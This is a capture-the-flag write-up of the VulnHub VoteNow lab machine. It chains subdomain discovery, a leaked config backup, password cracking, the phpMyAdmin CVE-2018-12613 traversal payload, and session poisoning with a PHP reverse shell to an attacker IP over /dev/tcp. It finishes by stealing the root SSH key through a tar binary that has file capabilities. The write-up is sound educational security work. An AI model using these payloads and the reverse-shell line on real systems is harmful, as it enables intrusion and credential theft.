# VulnHub VoteNow Machine Writeup

## Machine Information

- **Platform**: VulnHub
- **Machine Name**: VoteNow
- **Target IP**: 192.168.40.89
- **Operating System**: Linux (CentOS)
- **Difficulty**: Medium
- **Attack Vector**: LFI to RCE + Capabilities Exploitation

## Executive Summary

This writeup documents the exploitation of the VoteNow VulnHub machine, featuring phpMyAdmin CVE-2018-12613 exploitation for Local File Inclusion, session poisoning for Remote Code Execution, and Linux capabilities abuse for privilege escalation. The attack demonstrated advanced techniques including subdomain discovery, LFI to RCE conversion, and SSH key extraction through tar capabilities.

## Reconnaissance

### Port Scanning

```bash
sudo nmap -sS -p- --min-rate 5000 --open -n -Pn 192.168.40.89 -oN scan
```

![Port Scan Results](images/Pasted%20image%2020251012134955.png)

**Open Port**: 80 (HTTP)

### Service Enumeration

```bash
sudo nmap -sSCV -p80 -n -Pn 192.168.40.89 -oN nmap/vulnports
```

![Service Details](images/Pasted%20image%2020251012135252.png)

### Technology Detection

```bash
whatweb http://192.168.40.89
```

**Output**:

```
http://192.168.40.89 [200 OK] Apache[2.4.6], Bootstrap, 
Country[RESERVED][ZZ], Email[contact@example.com,contact@votenow.local], 
HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.5.38], 
IP[192.168.40.89], JQuery, PHP[5.5.38], Script, 
Title[Ontario Election Services » Vote Now!]
```

**Domain Discovery**: `votenow.local`

### Virtual Host Configuration

```bash
echo "192.168.40.89 votenow.local" >> /etc/hosts
```

### Initial Directory Enumeration

![Directory Fuzzing](images/Pasted%20image%2020251012142215.png)

No significant findings in initial fuzzing.

## Subdomain Discovery

### Virtual Host Enumeration

```bash
gobuster vhost -w /home/xon/Desktop/xon/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://votenow.local --append-domain | grep -v "400"
```

**Subdomain Found**: `datasafe.votenow.local`

![Subdomain Discovery](images/Pasted%20image%2020251012143810.png)

### Host Configuration Update

```bash
echo "192.168.40.89 votenow.local datasafe.votenow.local" >> /etc/hosts
```

### Subdomain Analysis

![Database Login](images/Pasted%20image%2020251012143318.png)

**Discovery**: phpMyAdmin login interface (credentials pending).

## Credential Discovery

### Extended Directory Enumeration

```bash
gobuster dir -w /home/xon/Desktop/xon/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://votenow.local -t 20 -x php,js,html,txt,bak,php.bak
```

![Extended Fuzzing](images/Pasted%20image%2020251012144405.png)

**Critical Finding**: `config.php.bak` backup file

### Database Credentials

![Config Backup](images/Pasted%20image%2020251012144444.png)

**Credentials Discovered**:

- **Username**: votebox
- **Password**: casoj3FFASPsbyoRP
- **Database**: votebox

## phpMyAdmin Access

### Database Authentication

![phpMyAdmin Login](images/Pasted%20image%2020251012145044.png)

**Success**: Authenticated access to phpMyAdmin.

### User Table Analysis

**Hash Found**: `$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i`

### Password Cracking

```bash
echo '$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i' > hash
john -w:/usr/share/wordlists/rockyou.txt hash
```

**Cracked Password**: Stella

**Credentials**: `admin:Stella`

## Vulnerability Exploitation

### phpMyAdmin Version Analysis

**Version**: phpMyAdmin 4.8.1 **CVE**: CVE-2018-12613

### Exploit Research

```bash
searchsploit phpmyadmin 4.8.1
```

**Results**:

```
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (php/webapps/44924.txt)
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (php/webapps/44928.txt)
phpMyAdmin 4.8.1 - Remote Code Execution (RCE) (php/webapps/50457.py)
```

### LFI Vulnerability

**Vulnerable Parameter**: `?target=`

**PoC Payload**:

```
/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
```

![LFI Success](images/Pasted%20image%2020251012145821.png)

**Result**: Successfully read `/etc/passwd` file.

### Session File Analysis

**Session Path**: `/var/lib/php/session/sess_[SESSION_ID]`

**Full Path**:

```
/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_rnd2oi2hlqaqnuoqgvvikqd4fcb7fkd2
```

![Session File](images/Pasted%20image%2020251012150749.png)

**Key Finding**: SQL queries are stored in session files, enabling session poisoning for RCE.

## Remote Code Execution

### Session Poisoning

**Malicious SQL Query**:

```sql
SELECT '<?php system("bash -i &>/dev/tcp/192.168.40.22/443 <&1"); ?>';
```

**Listener Setup**:

```bash
sudo nc -nlvp 443
```

**Execution**: Reload the session file URL to trigger the payload.

![Reverse Shell](images/Pasted%20image%2020251012151607.png)

**Result**: Reverse shell obtained as `apache` user.

## Lateral Movement

### User Authentication

Using previously cracked credentials:

```bash
su admin
# Password: Stella
```

![User Access](images/Pasted%20image%2020251012153205.png)

**Success**: Escalated to `admin` user.

### User Flag

```bash
[admin@votenow ~]$ ls
notes.txt  user.txt
[admin@votenow ~]$ cat user.txt 
663ba6a402a57536772c6118e8181570
[admin@votenow ~]$ cat notes.txt 
Reminders:

1) Utilise new commands to backup and compress sensitive files
```

**Hint**: Reference to backup and compression commands.

## Privilege Escalation

### Capabilities Enumeration

![Capabilities Discovery](images/Pasted%20image%2020251012154857.png)

**Critical Finding**: `/usr/bin/tarS` binary with special capabilities allowing arbitrary file compression.

### SSH Key Extraction

**Compress root SSH key**:

```bash
tarS -cvf id_rsa.tar /root/.ssh/id_rsa
```

**Extract archive**:

```bash
tar -xf id_rsa.tar 
cd root/.ssh
```

### Root Access

**SSH Connection**:

```bash
ssh -i id_rsa root@localhost -p 2082
```

![Root Shell](images/Pasted%20image%2020251012160840.png)

**Result**: Root privileges achieved.

## Technical Analysis

### Vulnerability Chain

1. **Subdomain Discovery** → phpMyAdmin interface
2. **Backup File Exposure** → Database credentials
3. **Password Cracking** → User credentials
4. **LFI Vulnerability** → File system access
5. **Session Poisoning** → Remote Code Execution
6. **Credential Reuse** → User escalation
7. **Capabilities Abuse** → Root access via SSH key extraction

### Key Vulnerabilities

- **CVE-2018-12613**: phpMyAdmin LFI vulnerability
- **Backup File Exposure**: Configuration files accessible
- **Session Poisoning**: SQL queries stored in session files
- **Weak Password**: Crackable bcrypt hash
- **Capabilities Misconfiguration**: tarS binary with dangerous permissions

### Exploitation Techniques

- **LFI to RCE**: Session file poisoning
- **File Inclusion**: Directory traversal via URL encoding
- **Capabilities Abuse**: Archive creation for sensitive file extraction
- **SSH Key Theft**: Private key extraction for authentication

## Key Lessons

1. **Backup Security**: Never expose configuration backups on web servers
2. **Session Management**: Avoid storing unsanitized user input in sessions
3. **Capabilities Hardening**: Restrict file capabilities to prevent abuse
4. **Password Complexity**: Use strong, uncrackable passwords
5. **Version Management**: Keep software updated to patch known vulnerabilities

## Conclusion

The VulnHub VoteNow machine demonstrated a realistic attack scenario combining web application vulnerabilities with system-level exploitation. The machine effectively showcased the dangers of exposed backup files, vulnerable phpMyAdmin versions, and misconfigured Linux capabilities. The attack path highlighted the importance of defense in depth and proper system hardening practices.
